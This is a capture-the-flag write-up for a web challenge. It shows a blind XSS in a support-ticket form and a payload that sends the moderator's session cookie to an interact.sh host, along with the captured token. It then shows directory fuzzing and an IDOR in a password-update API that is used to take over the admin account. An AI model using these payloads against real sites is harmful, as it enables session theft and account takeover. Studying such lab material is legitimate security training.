# Kryptos Support

TL;DR:

- Using OAST technique with blind XSS to steal moderator cookie.
- IDOR + Account takeover to get admin access

From the index page we can see that we can report an issue in a text-area and send it.

![1.png](Kryptos%20Support%200d1ec119df354f85a927bba805eb7857/1.png)

Let us report a dummy issue. 

```bash
POST /api/tickets/add HTTP/1.1
Host: 46.101.30.188:32677
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://46.101.30.188:32677/
Content-Type: application/json
Origin: http://46.101.30.188:32677
Content-Length: 46
Connection: close

{"message":"Nehal hacks for Vimal Pan Masala"}
```

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 55
ETag: W/"37-xX0taFpln/xC3zxt223Qgw6N4F8"
Date: Sun, 15 May 2022 18:11:00 GMT
Connection: close

{"message":"An admin will review your ticket shortly!"}
```

We see can see a response in JSON that says “**An admin will review your ticket shortly!**”. 

It gives an indication that the admin user will open the report issued in his browser.

If that is the case, we can achieve a blind XSS here. 

Why blind ? It is because we do not see the reported issue in our side.

Let us first test if blind XSS is possible here.

I will use OAST techniques with XSS payload to trigger an out-of-band interaction with a domain that we control.

**PAYLOAD**:

```html
<img src="http://ca0jy182vtc0000xb060gfyjxbyyyyyyb.interact.sh" alt="NehalHacksForVimalPanMasala" />
```

```bash
POST /api/tickets/add HTTP/1.1
Host: 46.101.30.188:32677
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://46.101.30.188:32677/
Content-Type: application/json
Origin: http://46.101.30.188:32677
Content-Length: 118
Connection: close

{"message":"<img src=\"http://ca0jy182vtc0000xb060gfyjxbyyyyyyb.interact.sh\" alt=\"NehalHacksForVimalPanMasala\" />"}
```

**REQUEST TO INTERACTSH**:

```bash
GET / HTTP/1.1
Host: ca0jy182vtc0000xb060gfyjxbyyyyyyb.interact.sh
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://127.0.0.1:1337/
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/101.0.4950.0 Safari/537.36
```

Since I can see an interaction to my interactsh subdomain, it is confirmed that the web application is indeed vulnerable to blind XSS.

Let us now try to steal the admin cookie.

**PAYLOAD**:

```jsx
<script>
document.write('<img src="http://ca0jy182vtc0000xb060gfyjxbyyyyyyb.interact.sh/?c='+document.cookie+'" />');
</script>
```

```bash
POST /api/tickets/add HTTP/1.1
Host: 46.101.30.188:32677
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://46.101.30.188:32677/
Content-Type: application/json
Origin: http://46.101.30.188:32677
Content-Length: 145
Connection: close

{"message":"<script>\ndocument.write('<img src=\"http://ca0jy182vtc0000xb060gfyjxbyyyyyyb.interact.sh/?c='+document.cookie+'\" />');\n</script>"}
```

**REQUEST TO INTERACTSH:**

```bash
GET /?c=session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2MzkwMzR9.Vl9JQDK1HWtW_ey7q49SCo7guxyRtBYiNYUDe3xSIfA HTTP/1.1
Host: ca0jy182vtc0000xb060gfyjxbyyyyyyb.interact.sh
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://127.0.0.1:1337/
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/101.0.4950.0 Safari/537.36
```

Now we can use this cookie to get admin access.

Hmmm. Even though we used the cookie, we do not know which endpoint to reach to get elevated access. Time for some directory fuzzing.

```bash
**~ ❯ sudo dirsearch -u http://46.101.30.188:32677/ -w /usr/share/wordlists/dirb/big.txt 
[sudo] password for kali: 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 20469

Output File: /usr/local/lib/python3.9/dist-packages/dirsearch/reports/138.68.183.64:30229/-_22-05-15_12-38-37.txt

Error Log: /usr/local/lib/python3.9/dist-packages/dirsearch/logs/errors-22-05-15_12-38-37.log

Target: http://138.68.183.64:30229/

[12:38:38] Starting: 
[12:38:46] 302 -   23B  - /ADMIN  ->  /   
[12:38:46] 302 -   23B  - /Admin  ->  /
[12:38:47] 200 -    2KB - /Login                    
[12:38:53] 302 -   23B  - /admin  ->  /      
[12:40:01] 200 -    2KB - /login                  
[12:40:01] 302 -   23B  - /logout  ->  / 
[12:40:39] 302 -   23B  - /settings  ->  /    
[12:40:46] 301 -  179B  - /static  ->  /static/
[12:40:53] 302 -   23B  - /tickets  ->  /       
                                            
Task Completed
<dirsearch.dirsearch.Program object at 0x7f18da37cd30>**
```

We have a `/admin` here. But going to that endpoint, it redirects us to `/tickets`. Moreover, we can see that we are logged in as **moderator**. So we are not really an admin.

If we go to the `/settings` endpoint, we get to see that we can change our password.

![2.png](Kryptos%20Support%200d1ec119df354f85a927bba805eb7857/2.png)

Let us see how this feature works.

```bash
POST /api/users/update HTTP/1.1
Host: 46.101.30.188:32677
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://46.101.30.188:32677/settings
Content-Type: application/json
Origin: http://46.101.30.188:32677
Content-Length: 54
Connection: close
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2MzkwMzR9.Vl9JQDK1HWtW_ey7q49SCo7guxyRtBYiNYUDe3xSIfA

{"password":"nehalHacksForVimalPanMasala","uid":"100"}
```

This is interesting. For updating password, we do not need to know the previous password. Moreover, the password is updated based on the `uid` only. If the server backend does not validate the `uid`, we may be able to find an `IDOR` here with which we can change any arbitrary user’s password. If the password is changed, we are successfully able to escalate the `IDOR` to an `Admin Account Takeover` with admin’s `uid` which is brute-forcible. 

Let us try that out with `uid` = 1 (just random).

```bash
POST /api/users/update HTTP/1.1
Host: 46.101.30.188:32677
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://46.101.30.188:32677/settings
Content-Type: application/json
Origin: http://46.101.30.188:32677
Content-Length: 52
Connection: close
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2MzkwMzR9.Vl9JQDK1HWtW_ey7q49SCo7guxyRtBYiNYUDe3xSIfA

{"password":"nehalHacksForVimalPanMasala","uid":"1"}
```

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 54
ETag: W/"36-RArwqjccHL1q7o0owZa+anWnvtw"
Date: Sun, 15 May 2022 18:40:56 GMT
Connection: close

{"message":"Password for admin changed successfully!"}
```

 

The response message confirms that we have successfully changed the admin password.

Now just login as admin. Remember, we have a `/login` endpoint.

![3.png](Kryptos%20Support%200d1ec119df354f85a927bba805eb7857/3.png)

That is all in this challenge 🙂 Hope you liked the writeup 🙂